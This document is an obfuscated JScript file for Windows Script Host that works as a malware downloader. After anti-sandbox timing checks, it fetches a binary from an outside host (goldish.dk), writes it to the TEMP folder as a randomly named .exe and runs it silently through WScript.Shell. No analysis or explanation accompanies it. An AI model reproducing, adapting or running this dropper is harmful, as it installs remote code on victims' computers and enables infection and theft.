var _A0 = false;
var _ES = "CreateObject";
var _S = function _ZC() {return WScript[_ES]("WScript"+".Shell");}(), _D = 11;
var _CT = "MSXML2.XMLHTTP";
var _TI = 2123213;
var _G = 0;
function _H(_K0){_S["Run"](_K0, _G, _G);};
function _A(){return _CT + "";};
function _XP(_W, _JX){_G = _G * 1; return _W - _JX;};
function _XR(){return _ES;};
/*@cc_on
  @if (@_win32 || @_win64)
    _A0 = true;
  @end
@*/
if (_A0)
{
var _JQ = "";
function _WJ(){return 22;};
var _CC = 0; var _N = 0;
function _HZ()
{
var _FE = new this["Date"]();
var _T = _FE["getUTCMilliseconds"]();
WScript["Sleep"](_WJ());
var _FE = new this["Date"]();
var _Y = _FE["getUTCMilliseconds"]();
WScript["Sleep"](_WJ());
var _FE = new this["Date"]();
var _PB = _FE["getUTCMilliseconds"]();
var _CC = "_V";
_CC = _XP(_Y, _T);
var _N = "_Z";
_N = _XP(_PB, _Y);
_JQ = "open";
return _XP(_CC, _N);
}
var _V0 = false;
var _O0 = false;
for (var _IF = _G; _IF < _WJ() * 1; _IF++){if (_HZ() != _G){
_V0 = true; 
_N = "31" + 11 * _CC + _N; 
_O0 = true; 
break;
}}
function _U() {return ((_V0 == true) && (_V0 == _O0)) ? 1 : _G;};
if (_V0 && _U() && _O0){
function _K() {return _S["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "zJCVBLwSgbY2Rr.ex" + "e";};
 _X = _A();
 _DG = WScript[_ES](_X);
 var _O = 1;
 while (_O){
try {
	if (_O == 1)
	{
		_DG[_JQ]("GET", "http://goldish.dk/o2pds", false);
		_DG["send"]();
		_UT = "Sleep";
	}
	WScript[_UT](_WJ() + 120); 
	if (_DG["readystate"] < 2 * 2) continue;
	_O = _G;
	function _UG(_PU) {var _M = (1, 2, 3, 4, 5, _PU); return _M;};
	_IR = WScript[_XR()]("ADODB.Stream");
	_X = _IR;
	_X[_JQ]();
	_X["type"] = _UG(1);
	_X["write"](_DG["ResponseBody"]);
	_IR["position"] = _UG(_G);
	_X["Save" + "ToFile"](_K(), 2);
	_IR["cl"+"ose"]();
	_PV = _K();
	_H(_PV);
} catch(_K1){};
}
}
}

